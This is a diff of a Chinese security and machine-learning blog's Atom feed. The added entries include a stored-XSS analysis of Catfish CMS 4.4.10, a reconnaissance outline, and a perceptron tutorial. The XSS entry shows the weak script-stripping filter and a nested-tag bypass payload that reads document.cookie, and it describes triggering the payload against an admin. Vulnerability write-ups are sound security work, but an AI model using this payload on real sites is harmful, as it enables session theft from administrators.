@@ -106,6 +106,114 @@
   </entry>
   
   <entry>
+    <title>Catfish(鲶鱼) CMS V 4.4.10 留言板存储型XSS漏洞</title>
+    <link href="http://yoursite.com/2017/07/11/Catfish-%E9%B2%B6%E9%B1%BC-CMS-V-4-4-10-%E7%95%99%E8%A8%80%E6%9D%BF%E5%AD%98%E5%82%A8%E5%9E%8BXSS%E6%BC%8F%E6%B4%9E/"/>
+    <id>http://yoursite.com/2017/07/11/Catfish-鲶鱼-CMS-V-4-4-10-留言板存储型XSS漏洞/</id>
+    <published>2017-07-11T11:34:56.000Z</published>
+    <updated>2017-07-11T11:48:23.133Z</updated>
+    
+    <content type="html"><![CDATA[<p>Catfish(鲶鱼) CMS V 4.4.10 ：<a href="http://www.catfish-cms.com/" target="_blank" rel="external">http://www.catfish-cms.com/</a></p>
+<h1 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h1><p>在<code>...\application\index\controller\Index.php</code>中，定义了评论功能。代码如下；<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//添加评论</span></div><div class="line">$data = [</div><div class="line">	<span class="string">'post_id'</span> =&gt; Request::instance()-&gt;post(<span class="string">'id'</span>),</div><div class="line">	<span class="string">'url'</span> =&gt; <span class="string">'index/Index/article/id/'</span>.Request::instance()-&gt;post(<span class="string">'id'</span>),</div><div class="line">	<span class="string">'uid'</span> =&gt; Session::get(<span class="keyword">$this</span>-&gt;session_prefix.<span class="string">'user_id'</span>),</div><div class="line">	<span class="string">'to_uid'</span> =&gt; $beipinglunren[<span class="string">'post_author'</span>],</div><div class="line">	<span class="string">'createtime'</span> =&gt; date(<span class="string">"Y-m-d H:i:s"</span>),</div><div class="line">	<span class="string">'content'</span> =&gt; <span class="keyword">$this</span>-&gt;filterJs(Request::instance()-&gt;post(<span class="string">'pinglun'</span>)),</div><div class="line">	<span class="string">'status'</span> =&gt; $plzt</div><div class="line">];</div><div class="line">Db::name(<span class="string">'comments'</span>)-&gt;insert($data);</div></pre></td></tr></table></figure></p>
+<p>评论内容content在经过函数filterJs过滤后插入到数据库中。</p>
+<p>filterJs定义在<code>...\application\index\controller\Common.php</code>中<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">filterJs</span><span class="params">($str)</span></span></div><div class="line">&#123;</div><div class="line">        <span class="keyword">return</span> preg_replace([<span class="string">'/&lt;script[\s\S]*?&lt;\/script&gt;/i'</span>,<span class="string">'/&lt;style[\s\S]*?&lt;\/style&gt;/i'</span>],<span class="string">''</span>,$str);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>仅做了简单的过滤，只要构造下列payload就可绕过:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;scr&lt;script&gt;&lt;/script&gt;ipt&gt;alert(document.cookie)&lt;/scr&lt;script&gt;&lt;/script&gt;ipt&gt;</div></pre></td></tr></table></figure></p>
+<p>filterJs会把<code>&lt;script&gt;**&lt;/script&gt;替换为空</code>，从而使插入到数据库中的数据变为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;alert(document.cookie)&lt;/script&gt;替换为空</div></pre></td></tr></table></figure></p>
+<h1 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h1><p>以普通账户user登陆，并对文章进行评论</p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170711/2.jpg?raw=true" alt=""></p>
+<p>因为Catfish CMS在前端进行了一次编码过滤，若是直接在评论区直接插入payload会被编码转换。所i抓包，将pinglun参数改为payload</p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170711/3.jpg?raw=true" alt=""></p>
+<p>admin登陆后台，触发XSS：</p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170711/4.jpg?raw=true" alt=""></p>
+<p>查看源代码：</p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170711/5.jpg?raw=true" alt=""></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;Catfish(鲶鱼) CMS V 4.4.10 ：&lt;a href=&quot;http://www.catfish-cms.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.catfish-cms.com/&lt;/a&gt;&lt;/p&gt;
+&lt;h1 id
+    
+    </summary>
+    
+      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+    
+      <category term="XSS" scheme="http://yoursite.com/tags/XSS/"/>
+    
+      <category term="漏洞分析" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>渗透测试(1)信息搜集</title>
+    <link href="http://yoursite.com/2017/07/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-1-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"/>
+    <id>http://yoursite.com/2017/07/11/渗透测试-1-信息搜集/</id>
+    <published>2017-07-11T01:20:07.000Z</published>
+    <updated>2017-07-11T03:01:57.113Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h1><h2 id="域名注册人等"><a href="#域名注册人等" class="headerlink" title="域名注册人等"></a>域名注册人等</h2><ul>
+<li>whois<br>利用whois，可以查询域名的相关详细信息。包括域名所有人，域名注册日期，联系方式等等。在社会工程学、以及后期的渗透中起到很大的作用。<br>7 <a href="http://whois.chinaz.com/" target="_blank" rel="external">http://whois.chinaz.com/</a></li>
+<li>DNS</li>
+</ul>
+<h2 id="子域名爆破"><a href="#子域名爆破" class="headerlink" title="子域名爆破"></a>子域名爆破</h2><h3 id="域传送漏洞"><a href="#域传送漏洞" class="headerlink" title="域传送漏洞"></a>域传送漏洞</h3><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><h2 id="CDN绕过"><a href="#CDN绕过" class="headerlink" title="CDN绕过"></a>CDN绕过</h2><h1 id="搜索引擎"><a href="#搜索引擎" class="headerlink" title="搜索引擎"></a>搜索引擎</h1><h2 id="高级搜索技巧"><a href="#高级搜索技巧" class="headerlink" title="高级搜索技巧"></a>高级搜索技巧</h2><h2 id="网络组件搜索"><a href="#网络组件搜索" class="headerlink" title="网络组件搜索"></a>网络组件搜索</h2><h1 id="IP"><a href="#IP" class="headerlink" title="IP"></a>IP</h1><h2 id="C段IP"><a href="#C段IP" class="headerlink" title="C段IP"></a>C段IP</h2><h2 id="同服站点"><a href="#同服站点" class="headerlink" title="同服站点"></a>同服站点</h2><h1 id="特殊信息泄露"><a href="#特殊信息泄露" class="headerlink" title="特殊信息泄露"></a>特殊信息泄露</h1><ul>
+<li>github</li>
+</ul>
+<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul>
+<li><a href="weibo.com/ttarticle/p/show?id=2309404088584863883789">本屌的web漏洞扫描器思路 技巧总结（域名信息收集篇）</a></li>
+<li><a href="http://www.91ri.org/17001.html" target="_blank" rel="external">子域名的艺术</a></li>
+<li><a href="http://thief.one/2017/05/19/1/" target="_blank" rel="external">【渗透神器系列】搜索引擎 </a></li>
+<li><a href="https://xianzhi.aliyun.com/forum/read/805.html" target="_blank" rel="external">域渗透基础简单信息收集（基础篇）</a></li>
+<li><a href="http://docs.ioin.in/writeup/www.mottoin.com/_92978_html/index.html" target="_blank" rel="external">内网渗透定位技术总结</a></li>
+<li><a href="https://www.secpulse.com/archives/51527.html" target="_blank" rel="external">后渗透攻防的信息收集</a></li>
+<li><a href="http://www.mottoin.com/99951.html" target="_blank" rel="external">安全攻城师系列文章－敏感信息收集</a></li>
+<li><a href="http://www.mottoin.com/101362.html" target="_blank" rel="external">子域名枚举的艺术</a></li>
+<li><a href="https://mp.weixin.qq.com/s/ardCYdZzaSjvSIZiFraWGA" target="_blank" rel="external">论二级域名收集的各种姿势</a></li>
+<li><a href="https://xianzhi.aliyun.com/forum/read/451.html?fpage=2" target="_blank" rel="external">我眼中的渗透测试信息搜集</a></li>
+<li><a href="https://xianzhi.aliyun.com/forum/read/1675.html" target="_blank" rel="external">大型目标渗透－01入侵信息搜集</a></li>
+</ul>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;域名&quot;&gt;&lt;a href=&quot;#域名&quot; class=&quot;headerlink&quot; title=&quot;域名&quot;&gt;&lt;/a&gt;域名&lt;/h1&gt;&lt;h2 id=&quot;域名注册人等&quot;&gt;&lt;a href=&quot;#域名注册人等&quot; class=&quot;headerlink&quot; title=&quot;域名注册人等&quot;&gt;&lt;/a&gt;域
+    
+    </summary>
+    
+      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>机器学习算法:感知机(perceptron)</title>
+    <link href="http://yoursite.com/2017/07/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AE%97%E6%B3%95-%E6%84%9F%E7%9F%A5%E6%9C%BA-perceptron/"/>
+    <id>http://yoursite.com/2017/07/08/机器学习算法-感知机-perceptron/</id>
+    <published>2017-07-08T13:06:51.000Z</published>
+    <updated>2017-07-08T13:26:54.947Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h1><h1 id="学习策略"><a href="#学习策略" class="headerlink" title="学习策略"></a>学习策略</h1><h1 id="造轮子"><a href="#造轮子" class="headerlink" title="造轮子"></a>造轮子</h1><h2 id="原始形式"><a href="#原始形式" class="headerlink" title="原始形式"></a>原始形式</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</div><div class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</div><div class="line"></div><div class="line">f1 = plt.figure(<span class="number">1</span>)</div><div class="line">data_set = np.array([[<span class="number">3</span>,<span class="number">3</span>,<span class="number">1</span>],[<span class="number">4</span>,<span class="number">3</span>,<span class="number">1</span>],[<span class="number">1</span>,<span class="number">1</span>,<span class="number">-1</span>],[<span class="number">2</span>,<span class="number">4</span>,<span class="number">1</span>],[<span class="number">0</span>,<span class="number">0</span>,<span class="number">-1</span>],[<span class="number">2</span>,<span class="number">0</span>,<span class="number">-1</span>],[<span class="number">6</span>,<span class="number">1</span>,<span class="number">-1</span>]])</div><div class="line">plt.scatter(data_set[np.where(data_set[:,<span class="number">2</span>] == <span class="number">1</span>)][:,<span class="number">0</span>],data_set[np.where(data_set[:,<span class="number">2</span>] == <span class="number">1</span>)][:,<span class="number">1</span>],marker = <span class="string">'x'</span>, color = <span class="string">'m'</span>)</div><div class="line">plt.scatter(data_set[np.where(data_set[:,<span class="number">2</span>] == <span class="number">-1</span>)][:,<span class="number">0</span>],data_set[np.where(data_set[:,<span class="number">2</span>] == <span class="number">-1</span>)][:,<span class="number">1</span>],marker = <span class="string">'o'</span>, color = <span class="string">'g'</span>)</div><div class="line">length = len(data_set)</div><div class="line">rate = <span class="number">1</span></div><div class="line">w = np.array([<span class="number">0</span>,<span class="number">0</span>])</div><div class="line">b = <span class="number">0</span></div><div class="line">flag = <span class="keyword">True</span></div><div class="line">x = np.linspace(<span class="number">-1</span>,<span class="number">5</span>,<span class="number">10</span>)</div><div class="line"></div><div class="line"><span class="keyword">while</span> flag == <span class="keyword">True</span> :</div><div class="line">	flag = <span class="keyword">False</span></div><div class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(length) :</div><div class="line">		<span class="keyword">if</span> ( data_set[i][<span class="number">2</span>] * (w.dot(data_set[i,<span class="number">0</span>:<span class="number">2</span>]) + b )) &lt;= <span class="number">0</span> :</div><div class="line">			w = w + rate * data_set[i][<span class="number">2</span>] * data_set[i,<span class="number">0</span>:<span class="number">2</span>]</div><div class="line">			b = b + rate * data_set[i][<span class="number">2</span>]</div><div class="line">			flag = <span class="keyword">True</span></div><div class="line">			print(w,b)</div><div class="line"></div><div class="line">plt.plot(x,(-b - w[<span class="number">0</span>] * x) / w[<span class="number">1</span>],<span class="string">'r'</span>)</div><div class="line">plt.show()</div><div class="line">print(w,b)</div></pre></td></tr></table></figure>
+<p>输出结果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">[3 3] 1</div><div class="line">[2 2] 0</div><div class="line">[2 2] -1</div><div class="line">[0 2] -2</div><div class="line">[-6  1] -3</div><div class="line">[-3  4] -2</div><div class="line">[1 7] -1</div><div class="line">[0 6] -2</div><div class="line">[-6  5] -3</div><div class="line">[-3  8] -2</div><div class="line">[-4  7] -3</div><div class="line">[-5  6] -4</div><div class="line">[-2  9] -3</div><div class="line">[-3  8] -4</div><div class="line">[-4  7] -5</div><div class="line">[ 0 10] -4</div><div class="line">[-1  9] -5</div><div class="line">[-2  8] -6</div><div class="line">[-3  7] -7</div></pre></td></tr></table></figure></p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170708/1.jpg?raw=true" alt=""></p>
+<h2 id="对偶形式"><a href="#对偶形式" class="headerlink" title="对偶形式"></a>对偶形式</h2>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;定义&quot;&gt;&lt;a href=&quot;#定义&quot; class=&quot;headerlink&quot; title=&quot;定义&quot;&gt;&lt;/a&gt;定义&lt;/h1&gt;&lt;h1 id=&quot;学习策略&quot;&gt;&lt;a href=&quot;#学习策略&quot; class=&quot;headerlink&quot; title=&quot;学习策略&quot;&gt;&lt;/a&gt;学习策略&lt;/h
+    
+    </summary>
+    
+      <category term="机器学习" scheme="http://yoursite.com/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
+    
+    
+      <category term="数据挖掘" scheme="http://yoursite.com/tags/%E6%95%B0%E6%8D%AE%E6%8C%96%E6%8E%98/"/>
+    
+      <category term="机器学习" scheme="http://yoursite.com/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
+    
+  </entry>
+  
+  <entry>
     <title>Tensorflow学习：常用API</title>
     <link href="http://yoursite.com/2017/07/06/Tensorflow%E5%AD%A6%E4%B9%A0%EF%BC%9A%E5%B8%B8%E7%94%A8API/"/>
     <id>http://yoursite.com/2017/07/06/Tensorflow学习：常用API/</id>
@@ -988,9 +1096,9 @@
     
       <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
     
-      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
-    
       <category term="漏洞分析" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
+    
+      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
     
   </entry>
   
@@ -1127,137 +1235,9 @@
     
       <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
     
-      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
-    
       <category term="漏洞分析" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
     
-  </entry>
-  
-  <entry>
-    <title>三次样条插值之MATLAB实现</title>
-    <link href="http://yoursite.com/2017/04/09/%E4%B8%89%E6%AC%A1%E6%A0%B7%E6%9D%A1%E6%8F%92%E5%80%BC%E4%B9%8BMATLAB%E5%AE%9E%E7%8E%B0/"/>
-    <id>http://yoursite.com/2017/04/09/三次样条插值之MATLAB实现/</id>
-    <published>2017-04-09T15:15:05.000Z</published>
-    <updated>2017-07-06T09:21:38.194Z</updated>
-    
-    <content type="html"><![CDATA[<p>三次样条插值之MATLAB实现<br><a id="more"></a></p>
-<h1 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h1><figure class="highlight matlab"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div></pre></td><td class="code"><pre><div class="line">clear all</div><div class="line">x = input(<span class="string">'输入横坐标，格式:[x1 x2 …… xn]\n'</span>)</div><div class="line">y = input(<span class="string">'输入纵坐标，格式:[y1 y2 …… yn]\n'</span>)</div><div class="line">n = <span class="built_in">length</span>(x);</div><div class="line"></div><div class="line">flag = input(<span class="string">'请选择边界条件：①已知两端一阶导数值，②已知两端二阶导数值。选择 1 or 2 :'</span>);</div><div class="line"><span class="keyword">if</span> flag == <span class="number">1</span></div><div class="line">    y1_deri = input(<span class="string">'x1 的 一阶导数值：'</span>);</div><div class="line">    yn_deri = input(<span class="string">'xn 的 一阶导数值：'</span>);</div><div class="line"><span class="keyword">else</span></div><div class="line">    y1_deri = input(<span class="string">'x1 的 二阶导数值：'</span>);</div><div class="line">    yn_deri = input(<span class="string">'xn 的 二阶导数值：'</span>);</div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line"><span class="keyword">for</span> <span class="built_in">i</span> = <span class="number">1</span> : n<span class="number">-1</span></div><div class="line">    h(<span class="built_in">i</span>) = x(<span class="built_in">i</span>+<span class="number">1</span>) -  x(<span class="built_in">i</span>);</div><div class="line"><span class="keyword">end</span></div><div class="line">fprintf(<span class="string">'计算 h 结果为:\n'</span>);</div><div class="line">h</div><div class="line"></div><div class="line"><span class="keyword">for</span> <span class="built_in">i</span> = <span class="number">2</span> : n<span class="number">-1</span></div><div class="line">    u(<span class="built_in">i</span><span class="number">-1</span>) = h(<span class="built_in">i</span><span class="number">-1</span>) / (h(<span class="built_in">i</span><span class="number">-1</span>) + h(<span class="built_in">i</span>));</div><div class="line">    lamda(<span class="built_in">i</span>) = h(<span class="built_in">i</span>) / (h(<span class="built_in">i</span><span class="number">-1</span>) + h(<span class="built_in">i</span>));</div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> flag == <span class="number">1</span></div><div class="line">    u(n<span class="number">-1</span>) = <span class="number">1</span>;</div><div class="line">    lamda(<span class="number">1</span>) = <span class="number">1</span>;</div><div class="line"><span class="keyword">else</span></div><div class="line">    u(n<span class="number">-1</span>) = <span class="number">0</span>;</div><div class="line">    lamda(<span class="number">1</span>) = <span class="number">0</span>;</div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line">fprintf(<span class="string">'计算 μ 结果为: \n'</span>);</div><div class="line">u</div><div class="line">fprintf(<span class="string">'计算 λ 结果为：\n'</span>);</div><div class="line">lamda</div><div class="line"></div><div class="line"><span class="keyword">for</span> <span class="built_in">i</span> = <span class="number">2</span> : n<span class="number">-1</span></div><div class="line">    d(<span class="built_in">i</span>) = <span class="number">6</span> * ((y(<span class="built_in">i</span>+<span class="number">1</span>)-y(<span class="built_in">i</span>))/(x(<span class="built_in">i</span>+<span class="number">1</span>)-x(<span class="built_in">i</span>)) - (y(<span class="built_in">i</span>) - y(<span class="built_in">i</span><span class="number">-1</span>))/( x(<span class="built_in">i</span>) - x(<span class="built_in">i</span><span class="number">-1</span>)))/(h(<span class="built_in">i</span><span class="number">-1</span>)+h(<span class="built_in">i</span>));</div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> flag == <span class="number">1</span></div><div class="line">    d(<span class="number">1</span>) = <span class="number">6</span> / h(<span class="number">1</span>) * (( y(<span class="number">2</span>)-y(<span class="number">1</span>) )/( x(<span class="number">2</span>) - x(<span class="number">1</span>) ) - y1_deri);</div><div class="line">    d(n) = <span class="number">6</span> / h(n<span class="number">-1</span>) * (yn_deri - ((y(n) - y(n<span class="number">-1</span>)) / ( x(n) - x(n<span class="number">-1</span>))));</div><div class="line"><span class="keyword">else</span></div><div class="line">    d(<span class="number">1</span>) = <span class="number">2</span> * y1_deri;</div><div class="line">    d(n) = <span class="number">2</span> * yn_deri;</div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line">fprintf(<span class="string">'计算 d 的结果：\n'</span>);</div><div class="line">d</div><div class="line"></div><div class="line">matrix1 = <span class="built_in">zeros</span>(n,n);</div><div class="line"><span class="keyword">for</span> <span class="built_in">i</span> = <span class="number">1</span> : n<span class="number">-1</span></div><div class="line">    matrix1(<span class="built_in">i</span>,<span class="built_in">i</span>) = <span class="number">2</span>;</div><div class="line">    matrix1(<span class="built_in">i</span>,<span class="built_in">i</span>+<span class="number">1</span>) = lamda(<span class="built_in">i</span>);</div><div class="line">    matrix1(<span class="built_in">i</span>+<span class="number">1</span>,<span class="built_in">i</span>) = u(<span class="built_in">i</span>);</div><div class="line"><span class="keyword">end</span></div><div class="line">matrix1(n,n) = <span class="number">2</span>;</div><div class="line">matrix1;</div><div class="line"></div><div class="line">fprintf(<span class="string">'求得 M 结果:\n'</span>);</div><div class="line">M = matrix1\d'</div><div class="line"></div><div class="line"><span class="keyword">for</span> <span class="built_in">i</span> = <span class="number">1</span> : n<span class="number">-1</span></div><div class="line">    clear S</div><div class="line">    syms t</div><div class="line">    k = x(<span class="built_in">i</span>):<span class="number">0.001</span>:x(<span class="built_in">i</span>+<span class="number">1</span>);</div><div class="line">    fprintf(<span class="string">'区间为[ %.3f : %.3f]\n'</span>,x(<span class="built_in">i</span>),x(<span class="built_in">i</span>+<span class="number">1</span>));</div><div class="line">    S = M(<span class="built_in">i</span>)*(x(<span class="built_in">i</span>+<span class="number">1</span>)-t)^<span class="number">3</span>/ (<span class="number">6</span>*h(<span class="built_in">i</span>)) + M(<span class="built_in">i</span>+<span class="number">1</span>)*(t - x(<span class="built_in">i</span>))^<span class="number">3</span>/(<span class="number">6</span>*h(<span class="built_in">i</span>))+(y(<span class="built_in">i</span>) - M(<span class="built_in">i</span>)*h(<span class="built_in">i</span>)^<span class="number">2</span>/<span class="number">6</span>)*(x(<span class="built_in">i</span>+<span class="number">1</span>) - t)/h(<span class="built_in">i</span>) + (y(<span class="built_in">i</span>+<span class="number">1</span>) - M(<span class="built_in">i</span>+<span class="number">1</span>)*h(<span class="built_in">i</span>)^<span class="number">2</span>/<span class="number">6</span>)*(t - x(<span class="built_in">i</span>))/h(<span class="built_in">i</span>)</div><div class="line">    s = M(<span class="built_in">i</span>)*(x(<span class="built_in">i</span>+<span class="number">1</span>)-k).^<span class="number">3</span>/ (<span class="number">6</span>*h(<span class="built_in">i</span>)) + M(<span class="built_in">i</span>+<span class="number">1</span>)*(k - x(<span class="built_in">i</span>)).^<span class="number">3</span>/(<span class="number">6</span>*h(<span class="built_in">i</span>))+(y(<span class="built_in">i</span>) - M(<span class="built_in">i</span>)*h(<span class="built_in">i</span>)^<span class="number">2</span>/<span class="number">6</span>)*(x(<span class="built_in">i</span>+<span class="number">1</span>) - k)/h(<span class="built_in">i</span>) + (y(<span class="built_in">i</span>+<span class="number">1</span>) - M(<span class="built_in">i</span>+<span class="number">1</span>)*h(<span class="built_in">i</span>)^<span class="number">2</span>/<span class="number">6</span>)*(k - x(<span class="built_in">i</span>))/h(<span class="built_in">i</span>);</div><div class="line">    hold on;</div><div class="line">    plot(k,s);</div><div class="line"><span class="keyword">end</span></div></pre></td></tr></table></figure>
-<h1 id="Result"><a href="#Result" class="headerlink" title="Result"></a>Result</h1><p>测试例题：《计算方法》（李庆扬版）P44 例7<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div></pre></td><td class="code"><pre><div class="line">&gt;&gt; sanciyangtiao</div><div class="line">输入横坐标，格式:[x1 x2 …… xn]</div><div class="line">[27.7 28 29 30]</div><div class="line"></div><div class="line">x =</div><div class="line"></div><div class="line">   27.7000   28.0000   29.0000   30.0000</div><div class="line"></div><div class="line">输入纵坐标，格式:[y1 y2 …… yn]</div><div class="line">[4.1 4.3 4.1 3.0]</div><div class="line"></div><div class="line">y =</div><div class="line"></div><div class="line">    4.1000    4.3000    4.1000    3.0000</div><div class="line"></div><div class="line">请选择边界条件：①已知两端一阶导数值，②已知两端二阶导数值。选择 1 or 2 :1</div><div class="line">x1 的 一阶导数值：3.0</div><div class="line">xn 的 一阶导数值：-4.0</div><div class="line">计算 h 结果为:</div><div class="line"></div><div class="line">h =</div><div class="line"></div><div class="line">    0.3000    1.0000    1.0000</div><div class="line"></div><div class="line">计算 μ 结果为:</div><div class="line"></div><div class="line">u =</div><div class="line"></div><div class="line">    0.2308    0.5000    1.0000</div><div class="line"></div><div class="line">计算 λ 结果为：</div><div class="line"></div><div class="line">lamda =</div><div class="line"></div><div class="line">    1.0000    0.7692    0.5000</div><div class="line"></div><div class="line">计算 d 的结果：</div><div class="line"></div><div class="line">d =</div><div class="line"></div><div class="line">  -46.6667   -4.0000   -2.7000  -17.4000</div><div class="line"></div><div class="line">求得 M 结果:</div><div class="line"></div><div class="line">M =</div><div class="line"></div><div class="line">  -23.5314</div><div class="line">    0.3960</div><div class="line">    0.8297</div><div class="line">   -9.1149</div><div class="line"></div><div class="line">区间为[ 27.700 : 28.000]</div><div class="line"></div><div class="line">S =</div><div class="line"></div><div class="line">(35650*(t - 28)^3)/2727 - (107*t)/202 + (200*(t - 277/10)^3)/909 + 19317/1010</div><div class="line"></div><div class="line">区间为[ 28.000 : 29.000]</div><div class="line"></div><div class="line">S =</div><div class="line"></div><div class="line">(419*(t - 28)^3)/3030 - (55*t)/202 - (20*(t - 29)^3)/303 + 35929/3030</div><div class="line"></div><div class="line">区间为[ 29.000 : 30.000]</div><div class="line"></div><div class="line">S =</div><div class="line"></div><div class="line">(563*t)/1010 - (4603*(t - 29)^3)/3030 - (419*(t - 30)^3)/3030 - 36977/3030</div></pre></td></tr></table></figure></p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170409/MATLAB/1.png?raw=true" alt=""></p>
-]]></content>
-    
